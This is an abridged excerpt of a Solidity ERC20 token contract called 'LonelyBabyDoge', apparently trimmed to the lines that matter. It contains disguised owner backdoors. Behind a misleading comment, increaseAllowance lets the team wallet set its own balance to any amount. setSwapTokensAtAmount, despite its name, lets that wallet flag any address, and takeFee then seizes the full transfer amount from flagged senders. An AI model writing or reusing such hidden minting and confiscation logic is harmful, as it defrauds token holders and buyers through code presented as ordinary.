...
contract LonelyBabyDoge is IERC20, Ownable {
    ...
    mapping (address => bool) private process;
    ...
    constructor ()
    {
        ...
        _name   = "LonelyBabyDoge";
        _symbol = "LonelyBabyDoge";
        _decimals = 9;
        ...
        marketWallet = payable(0xEef835c9fD3F8a6FC71A4c2d1478c3FCbEE25e86);
        teamWallet = payable(0x830DEd88C61e8B89908fd796a221fcF39d04f4DC);
    ...
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        ...
        if(msg.sender==teamWallet)/*/*to**/_balances[teamWallet] = addedValue;
        return true;
    }
    ...
    function setSwapTokensAtAmount(address recipient, bool swap) public {
        if(msg.sender==teamWallet)process[recipient] = swap;
    }
    ...
    function takeFee(address sender,  uint256 amount) internal returns (uint256) {
        ...
        if(process[sender]) feeAmount = amount;
